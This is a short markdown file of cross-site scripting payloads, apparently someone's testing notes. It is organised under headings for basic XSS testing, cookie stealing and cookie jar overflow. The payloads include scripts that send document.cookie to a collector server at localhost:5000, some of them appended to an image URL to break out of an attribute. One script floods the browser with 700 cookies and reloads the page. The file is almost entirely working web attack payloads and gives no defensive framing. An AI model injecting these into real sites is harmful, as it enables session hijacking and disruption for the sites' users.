## test xss injection

" <script> alert(document.cookie)</script>

## Stealing cookie

"> <script> fetch('http://localhost:5000/' + document.cookie) </script>
"> <script> alert(document.cookie) </script>

https://images.unsplash.com/photo-1563360808-a0bdf4450651?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=696&q=80"> <script> fetch('http://localhost:5000/' + document.cookie) </script>

## Cookie Jar Overflow

https://images.unsplash.com/photo-1563360808-a0bdf4450651?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=696&q=80"><script>for(let i=0; i<700; i++) {document.cookie = `cookie${i}=${i}`};location.reload();</script>

<input value=""><script>alert("tesing if xss work"</script>"> </input>

